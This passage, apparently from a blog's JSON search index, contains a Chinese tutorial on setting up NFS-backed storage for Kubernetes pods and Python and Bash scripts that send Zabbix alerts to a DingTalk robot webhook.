\u003cspan class=\"nb\"\u003eenable\u003c/span\u003e rpcbind nfs-server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl restart rpcbind nfs-server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eshowmount -e localhost\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#客户端根本不装也可以，客户端不需要启动任何nfs服务\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#只是为了使用showmount工具来验证\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#NFS客户端（CentOS，所有WorkNode节点都需要执行）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y nfs-utils\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#NFS客户端（Ubuntu，所有WorkNode节点都需要执行）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt install -y nfs-common\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eNFS 服务端的参数如下：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003erw 能读能写\u003c/li\u003e\n\u003cli\u003einsecure NFS通过1024以上的端口发送\u003c/li\u003e\n\u003cli\u003eroot_squash root会被变成noboby，其他人不变\u003c/li\u003e\n\u003cli\u003eno_root_squash root身份保持不变，其他人不变。（不能用这个，容易被黑）\u003c/li\u003e\n\u003cli\u003eall_squash 不论登入NFS的使用者身份为何，他的身份都会被压缩成为匿名使用者，通常也就是nobody\u003c/li\u003e\n\u003cli\u003esync 数据直接落盘，性能略损。\u003c/li\u003e\n\u003cli\u003easync 数据先落内存，然后落盘，性能略升。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e综上，保险的参数就是\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e/data/nfs 10.10.0.0/16(rw,insecure,all_squash,sync)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e注意：修改了/etc/exports后，并不需要重启nfs服务，只要用exportfs重新扫描一次/etc/exports，并且重新加载即可\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eexports -rv\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"二pod内直接使用\"\u003e二、POD内直接使用\u003c/h4\u003e\n\u003cp\u003e由于nfs是内核自带的东西，所以最简单的使用方法就是直接在pod内使用\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003eapiVersion\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ev1\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003ekind\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ePod\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003emetadata\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003etest\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003elabels\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eapp.kubernetes.io/name\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ealpine\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003espec\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003econtainers\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ealpine\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eimage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ealpine:latest\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003ecommand\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"l\"\u003etouch\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"l\"\u003e/data/test\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003evolumeMounts\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003enfs-volume\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003emountPath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e/data\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003evolumes\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003enfs-volume\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003enfs\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003eserver\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e10.10.247.38\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e/data\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003ereadOnly\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003eno\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这个pod是一次性运行的，运行完后就可以看到nfs中多了个test文件\u003c/p\u003e","title":"kubernetes使用nfs做持久化卷存储"},{"content":"#!/usr/bin/env python #coding:utf-8 #zabbix钉钉报警 import requests import json import sys import os import datetime #这里是自己创建的机器人的webhook webhook=\u0026#34;https://oapi.dingtalk.com/robot/send?access_token=xxxxxx\u0026#34; user=sys.argv[1] text=sys.argv[3] data={ \u0026#34;msgtype\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;text\u0026#34;: { \u0026#34;content\u0026#34;: text }, \u0026#34;at\u0026#34;: { \u0026#34;atMobiles\u0026#34;: [ user ], \u0026#34;isAtAll\u0026#34;: False } } headers = {\u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;} x=requests.post(url=webhook,data=json.dumps(data),headers=headers) 下面放shell脚本的\n#!/bin/bash function ddmsg() { Token=\u0026#34;xxxxxxxxxxxx\u0026#34; Weburl=\u0026#34;https://oapi.dingtalk.com/robot/send?access_token=\u0026#34; curl -ks -m 2 \u0026#34;${Weburl}${Token}\u0026#34; \\ -H \u0026#39;Content-Type: application/json;charset=utf-8\u0026#39; \\ -d \u0026#34;{\u0026#39;msgtype\u0026#39;: \u0026#39;text\u0026#39;, \u0026#39;text\u0026#39;: { \u0026#39;content\u0026#39;: \u0026#39;$*\u0026#39;} }\u0026#34; \u0026amp;\u0026gt;/tmp/ddmsg.log if [ `grep \u0026#34;errmsg.*ok\u0026#34; /tmp/ddmsg.log |wc -l` -ne 1 ]; then echo \u0026#39;send error !\u0026#39;;cat /tmp/ddmsg.log;exit 1; fi } #测试内容 echo \u0026#34;@警报 主机:$(hostname) 信息:Node test 时间:$(date +\u0026#34;%F %T\u0026#34;) \u0026#34;\u0026gt;.msg cat .msg ddmsg \u0026#34;`cat .msg`\u0026#34; ","permalink":"https://rendoumi.com/posts/20221123-dingding/","summary":"\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"ch\"\u003e#!/usr/bin/env python\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#coding:utf-8\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#zabbix钉钉报警\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003erequests\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003ejson\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003esys\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003eos\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003edatetime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#这里是自己创建的机器人的webhook\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ewebhook\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;https://oapi.dingtalk.com/robot/send?access_token=xxxxxx\u0026#34;\u003c/span\u003e      \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003euser\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003esys\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003esys\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;msgtype\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;content\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003etext\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;at\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;atMobiles\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"n\"\u003euser\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"p\"\u003e],\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;isAtAll\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eheaders\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Content-Type\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;application/json\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epost\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ewebhook\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edumps\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e\u003cspan class=\"n\"\u003eheaders\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eheaders\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e下面放shell脚本的\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e ddmsg\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eToken\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxxxxxx\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eWeburl\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;https://oapi.dingtalk.com/robot/send?access_token=\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    curl -ks -m \u003cspan class=\"m\"\u003e2\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eWeburl\u003c/span\u003e\u003cspan class=\"si\"\u003e}${\u003c/span\u003e\u003cspan class=\"nv\"\u003eToken\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e        -H \u003cspan class=\"s1\"\u003e\u0026#39;Content-Type: application/json;charset=utf-8\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e        -d \u003cspan class=\"s2\"\u003e\u0026#34;{\u0026#39;msgtype\u0026#39;: \u0026#39;text\u0026#39;, \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e             \u0026#39;text\u0026#39;: { \u0026#39;content\u0026#39;: \u0026#39;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$*\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        }\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u0026gt;/tmp/ddmsg.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"sb\"\u003e`\u003c/span\u003egrep \u003cspan class=\"s2\"\u003e\u0026#34;errmsg.*ok\u0026#34;\u003c/span\u003e /tmp/ddmsg.log \u003cspan class=\"p\"\u003e|\u003c/span\u003ewc -l\u003cspan class=\"sb\"\u003e`\u003c/span\u003e -ne \u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;send error !\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003ecat /tmp/ddmsg.log\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nb\"\u003eexit\u003c/span\u003e 1\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#测试内容\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;@警报\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e主机:\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ehostname\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e信息:Node 